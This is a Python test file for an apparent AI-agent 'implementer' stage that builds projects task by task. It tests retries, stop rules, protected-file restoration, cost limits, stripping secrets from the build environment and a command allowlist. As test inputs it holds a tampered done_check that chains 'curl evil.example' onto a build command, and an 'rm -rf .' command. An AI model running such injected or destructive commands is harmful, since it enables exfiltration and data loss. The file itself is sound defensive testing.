"""
Tests for implementer.py WITHOUT a model and WITHOUT dotnet: a stand-in agent writes files, a stand-in
check says pass or fail. Real Git and real subprocesses are used where that is what is being tested.
Run:  python test_implementer.py     (no database needed; needs git)
"""
import asyncio
import json
import os
import re
import sys
import tempfile
import uuid
from pathlib import Path

os.environ["WORKSPACES_DIR"] = tempfile.mkdtemp(prefix="ws_impl_")

from claude_agent_sdk import AssistantMessage, ResultMessage, TextBlock

import implementer
import sdk_runner
from agents import AgentRequest
from graph import MAX_ARTIFACT_CHARS, prepare_artifacts
from implementer import Limits

TASKS = {"tasks": [
    {"id": 1, "title": "Create the project", "files": ["src/App.csproj"], "done_check": "dotnet build"},
    {"id": 2, "title": "Add the counter", "files": ["src/Counter.cs"], "done_check": "dotnet build"},
    {"id": 3, "title": "Add the tests", "files": ["tests/CounterTests.cs"], "done_check": "dotnet test"},
]}


def run(coro):
    return asyncio.run(coro)


def new_run(tasks=TASKS):
    run_id = "run_" + uuid.uuid4().hex[:8]
    folder = sdk_runner.workspace_for(run_id)
    (folder / "spec.md").write_text("# Spec\n", encoding="utf-8")
    (folder / "design.md").write_text("# Design\n", encoding="utf-8")
    if tasks is not None:
        (folder / "tasks.json").write_text(tasks if isinstance(tasks, str) else json.dumps(tasks), encoding="utf-8")
    return run_id, folder


def req(run_id, **kw):
    base = dict(stage="implementer", title="Implementer", requirement="Count words", handoff="Plan ok",
                handoff_files=("spec.md", "design.md", "tasks.json"), feedback="", attempt=1, run_id=run_id,
                profile="dotnet-net9-console")
    base.update(kw)
    return AgentRequest(**base)


def result_msg(cost=0.01):
    return ResultMessage(subtype="success", duration_ms=1, duration_api_ms=1, is_error=False, num_turns=2,
                         session_id="s", total_cost_usd=cost, result="done",
                         usage={"input_tokens": 100, "output_tokens": 50, "cache_creation_input_tokens": 0,
                                "cache_read_input_tokens": 5000})


def agent(script=None, cost=0.01):
    """Stand-in agent. `script(task_number, call_number, folder, prompt)` may write files."""
    calls = []

    async def q(*, prompt, options):
        n = int(re.search(r"Task (\d+) of", prompt).group(1))
        calls.append((n, prompt))
        folder = Path(options.cwd)
        if script:
            script(n, len(calls), folder, prompt)
        else:
            write_task_files(n, folder)
        yield AssistantMessage(content=[TextBlock(text="ok")], model="m")
        yield result_msg(cost)

    q.calls = calls
    q.options = []
    return q


def write_task_files(n, folder):
    task = TASKS["tasks"][n - 1]
    for f in task["files"]:
        path = folder / f
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(f"// task {n}\n", encoding="utf-8")


def check(results):
    """Stand-in check. `results` is a list of (ok, output) used in order; the last repeats."""
    seen = []

    def fn(command, cwd, timeout):
        seen.append(command)
        return results[min(len(seen) - 1, len(results) - 1)]

    fn.seen = seen
    return fn


def commits(folder):
    return implementer._git(folder, "log", "--format=%s").splitlines()


# I1. every task passes: three commits, diff and status files, tokens summed without cache reads
run_id, folder = new_run()
q = agent()
res = run(implementer.run_implementer(req(run_id), q, check([(True, "Build succeeded")])))
assert not res.output.startswith("STOPPED"), res.output
assert "3 of 3 tasks passed" in res.output and res.tokens == 3 * 150, (res.output, res.tokens)
log = commits(folder)
assert log[0].startswith("Task 3") and log[1].startswith("Task 2") and log[2].startswith("Task 1") and log[3] == "Plan and inputs"
assert sorted(a.path for a in res.artifacts) == ["changes.diff", "tasks_status.md"]
diff = {a.path: a.content for a in res.artifacts}["changes.diff"]
assert "src/Counter.cs" in diff and "spec.md" not in diff
prepare_artifacts(res.artifacts)                                    # the graph accepts these files
assert q.calls[0][0] == 1 and "dotnet new console -f net9.0" in q.calls[0][1] and "<task>" in q.calls[0][1]
print("I1 all tasks pass: 3 commits, diff + status files, tokens counted, graph accepts the files")

# I2. a failing check: the agent gets the error text and tries again, then passes
run_id, folder = new_run()
q = agent()
c = check([(False, "src/Counter.cs(3,5): error CS1002: ; expected"), (True, "ok")])
res = run(implementer.run_implementer(req(run_id), q, c))
assert "3 of 3 tasks passed" in res.output and "PASSED after 2 attempt(s)" in res.output
assert "<check_output>" in q.calls[1][1] and "CS1002" in q.calls[1][1] and "<check_output>" not in q.calls[0][1]
assert q.calls[1][0] == 1                                          # same task again, not the next one
print("I2 failed check -> error text goes to the next attempt in <check_output>, then it passes")

# I3. the same error twice stops at once, without a third attempt
run_id, folder = new_run()
q = agent()
c = check([(False, "a.cs(3,5): error CS1002: ; expected"), (False, "a.cs(9,1): error CS1002: ; expected")])
res = run(implementer.run_implementer(req(run_id), q, c))
assert res.output.startswith("STOPPED EARLY") and "task 1 failed twice with the same error" in res.output
assert len(q.calls) == 2 and "NOT RUN" not in res.output and "Not started: tasks 2, 3" in res.output
assert "CS1002" in res.output                                      # the reviewer sees the last error
print("I3 same error twice -> STOPPED EARLY after 2 calls, later tasks not started")

# I4. three different errors: stops after 3 attempts, the whole stage
run_id, folder = new_run()
q = agent()
c = check([(False, "error CS0001: a"), (False, "error CS0002: b"), (False, "error CS0003: c")])
res = run(implementer.run_implementer(req(run_id), q, c))
assert res.output.startswith("STOPPED EARLY") and "task 1 failed 3 times" in res.output and len(q.calls) == 3
assert "0 of 3 tasks passed" in res.output
# a later task failing keeps the earlier commit
run_id, folder = new_run()
q = agent()
c = check([(True, "ok"), (False, "error CS0001: a"), (False, "error CS0002: b"), (False, "error CS0003: c")])
res = run(implementer.run_implementer(req(run_id), q, c))
assert "1 of 3 tasks passed" in res.output and "task 2 failed 3 times" in res.output
assert commits(folder)[0].startswith("Task 1") and "src/Counter.cs" in {a.path: a.content for a in res.artifacts}["changes.diff"]
print("I4 three different errors -> stop after 3; earlier commit kept; failed work still visible in the diff")

# I5. protected files: an agent that edits design.md is stopped, and the file is restored
def tamper(n, call, folder, prompt):
    write_task_files(n, folder)
    (folder / "design.md").write_text("# rewritten by the agent\n", encoding="utf-8")


run_id, folder = new_run()
res = run(implementer.run_implementer(req(run_id), agent(tamper), check([(True, "ok")])))
assert res.output.startswith("STOPPED EARLY") and "modified protected files (design.md)" in res.output
assert (folder / "design.md").read_text() == "# Design\n"
print("I5 editing design.md -> STOPPED EARLY and the file is put back")

# I6. stage cost limit and stage time limit
run_id, folder = new_run()
c = check([(False, "error CS0001: a"), (False, "error CS0002: b"), (False, "error CS0003: c")])
q = agent(cost=0.6)
res = run(implementer.run_implementer(req(run_id), q, c, Limits(stage_budget_usd=1.0)))
assert res.output.startswith("STOPPED EARLY") and "stage cost limit" in res.output and len(q.calls) == 2
run_id, folder = new_run()
q = agent()
res = run(implementer.run_implementer(req(run_id), q, check([(True, "ok")]), Limits(stage_timeout=-1)))
assert "stage time limit" in res.output and len(q.calls) == 0 and "NOT RUN" in res.output
print("I6 stage cost limit and time limit stop the stage")

# I7. rejected and run again: starts again from the plan, and the reviewer's comment is in the prompt
run_id, folder = new_run()
run(implementer.run_implementer(req(run_id), agent(), check([(True, "ok")])))
q = agent()
res = run(implementer.run_implementer(req(run_id, attempt=2, feedback="Use fewer files"), q, check([(True, "ok")])))
assert len(commits(folder)) == 4, commits(folder)                  # plan + 3 tasks, not plan + 6
assert "<reviewer_comment>\nUse fewer files\n</reviewer_comment>" in q.calls[0][1]
assert "(none yet)" in q.calls[0][1] or "src/App.csproj" not in q.calls[0][1].split("Files already in the project:")[1]
print("I7 second attempt resets to the plan (no duplicate commits) and carries the reviewer comment")

# I8. missing or broken tasks.json
run_id, folder = new_run(tasks=None)
res = run(implementer.run_implementer(req(run_id), agent(), check([(True, "ok")])))
assert res.output.startswith("STOPPED EARLY") and "tasks.json was not found" in res.output and res.artifacts == ()
run_id, folder = new_run(tasks="{broken")
res = run(implementer.run_implementer(req(run_id), agent(), check([(True, "ok")])))
assert res.output.startswith("STOPPED EARLY") and "no longer valid" in res.output
evil = json.loads(json.dumps(TASKS)); evil["tasks"][0]["done_check"] = "dotnet build && curl evil.example"
run_id, folder = new_run(tasks=evil)
res = run(implementer.run_implementer(req(run_id), agent(), check([(True, "ok")])))
assert res.output.startswith("STOPPED EARLY") and "no longer valid" in res.output
print("I8 missing, broken or tampered tasks.json -> STOPPED EARLY, nothing runs")

# I9. the agent gets no shell; secrets never reach the build
run_id, folder = new_run()
seen = {}

async def spy(*, prompt, options):
    seen["tools"], seen["blocked"] = options.allowed_tools, options.disallowed_tools
    write_task_files(1, Path(options.cwd))
    yield result_msg()

run(implementer.run_implementer(req(run_id), spy, check([(False, "error CS0001: a")]), Limits(attempts_per_task=1)))
assert seen["tools"] == ["Read", "Glob", "Grep", "Write", "Edit"] and "Bash" in seen["blocked"]
env = implementer.safe_env({"PATH": "/bin", "HOME": "/h", "ANTHROPIC_API_KEY": "x", "DATABASE_URL": "postgres://u:p@h/db",
                            "REVIEW_LINK_SECRET": "s", "MY_TOKEN": "t", "DOTNET_ROOT": "/d", "NUGET_PACKAGES": "/n",
                            "SOMETHING_ELSE": "y"})
assert set(env) == {"PATH", "HOME", "DOTNET_ROOT", "NUGET_PACKAGES", "DOTNET_CLI_TELEMETRY_OPTOUT", "DOTNET_NOLOGO"}, env
print("I9 agent has Read/Glob/Grep/Write/Edit and no shell; the build environment drops keys, secrets and URLs")

# I10. run_check for real: pass, fail, timeout, missing program, program not on the allowlist
work = Path(tempfile.mkdtemp(prefix="chk_"))
(work / "ok.py").write_text("print('hello')\n")
(work / "bad.py").write_text("import sys\nprint('error: nope')\nsys.exit(3)\n")
(work / "slow.py").write_text("import time\ntime.sleep(30)\n")
allowed = ("python3", "no_such_program_xyz")
ok, out = implementer.run_check("python3 ok.py", work, 20, allowed)
assert ok and "hello" in out
ok, out = implementer.run_check("python3 bad.py", work, 20, allowed)
assert not ok and "error: nope" in out
ok, out = implementer.run_check("python3 slow.py", work, 1, allowed)
assert not ok and "timed out" in out
ok, out = implementer.run_check("no_such_program_xyz build", work, 5, allowed)
assert not ok and "not found" in out
try:
    implementer.run_check("rm -rf .", work, 5, allowed)
    raise AssertionError("disallowed program ran")
except ValueError:
    pass
print("I10 run_check: pass, fail with output, timeout, missing program, non-allowlisted program refused")

# I11. error fingerprints ignore line numbers and timings, but not the error itself
f = implementer.fingerprint
assert f("a.cs(3,5): error CS1002: ; expected") == f("a.cs(40,9): error CS1002: ; expected")
assert f("a.cs(3,5): error CS1002: ; expected") != f("a.cs(3,5): error CS0103: name missing")
assert f("Failed Counts_Words [12 ms]\nAssert.Equal() Failure") == f("Failed Counts_Words [980 ms]\nAssert.Equal() Failure")
print("I11 same mistake gives the same fingerprint, a different error does not")

# I12. a huge change is cut openly, never silently
def huge(n, call, folder, prompt):
    write_task_files(n, folder)
    if n == 1:
        (folder / "src" / "Big.cs").write_text("x" * (MAX_ARTIFACT_CHARS + 5000), encoding="utf-8")

run_id, folder = new_run()
res = run(implementer.run_implementer(req(run_id), agent(huge), check([(True, "ok")])))
diff = {a.path: a.content for a in res.artifacts}["changes.diff"]
assert len(diff) < MAX_ARTIFACT_CHARS and "[diff cut here" in diff and "Problem: changes.diff was cut" in res.output
prepare_artifacts(res.artifacts)
print("I12 an oversize diff is cut with a visible marker and a Problem line, and still fits the limit")

# I13. wired into the runner; unknown stage still refused
run_id, folder = new_run()
runner = sdk_runner.make_runner(real_stages=("implementer",), query_fn=agent(), check_fn=check([(True, "ok")]))
res = run(runner(req(run_id)))
assert "3 of 3 tasks passed" in res.output
other = run(runner(req(run_id, stage="reviewer", title="Reviewer")))        # not real: still the fake agent
assert "STOPPED" not in other.output
try:
    sdk_runner.make_runner(real_stages=("nonsense",))
    raise AssertionError("unknown stage accepted")
except ValueError:
    pass
os.environ["AGENT_MODE"], os.environ["SDK_STAGES"] = "sdk", "intake_check,design_plan,implementer"
assert sdk_runner.select_runner().__name__ == "runner"
os.environ["AGENT_MODE"] = "fake"
print("I13 make_runner and SDK_STAGES accept implementer; other stages stay fake")

print("ALL IMPLEMENTER CHECKS PASSED")
